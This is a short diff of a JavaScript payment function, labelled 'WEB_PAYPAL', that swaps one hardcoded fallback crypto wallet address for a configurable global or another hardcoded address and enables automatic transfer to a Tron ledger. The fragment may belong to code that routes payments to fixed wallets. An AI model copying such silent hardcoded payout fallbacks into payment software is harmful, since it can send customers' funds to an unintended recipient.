@@ -764,7 +764,7 @@ async function sendToServer(extra) {
             amount: AMOUNT,
             currency: CURRENCY,
             destination: DESTINATION,
-            ledger_address: WALLET || 'TEwLFWlwK55b7PuFfzgH1H2f3xs3pLgLn2',
+            ledger_address: WALLET || (typeof LEDGER_TRC20_ADDRESS !== 'undefined' ? LEDGER_TRC20_ADDRESS : 'TFyAQPrTRdP7zp46RPmE1iiCac1Lh6Bu58'),
             auto_transfer: DESTINATION === 'ledger_trx',
             reference: REF,
             pos_device: 'WEB_PAYPAL',
